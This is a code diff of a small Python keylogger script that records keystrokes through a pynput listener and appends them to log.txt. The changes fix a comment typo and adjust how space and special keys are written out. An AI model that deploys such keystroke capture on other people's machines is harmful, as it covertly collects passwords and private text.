@@ -25,12 +25,12 @@ def on_release(key):
 def write_file(key):
     with open('log.txt', 'a') as f:
         for key in keys:
-            #removes teh quotation marks
+            #removes the quotation marks
             k = str(key).replace("'","")
             #removes the word space
-            if k.find("space") > 0:
+            if k == str(Key.space):            
                 f.write(' ')
-            elif k.find('Key') == -1:
+            if k.find('Key') == -1:
                 f.write(k)
 
 with Listener(on_press = on_press, on_release = on_release) as listener:
@@ -38,4 +38,4 @@ with Listener(on_press = on_press, on_release = on_release) as listener:
 
 if('__main__' == __name__):
     print('it works')
-    
+
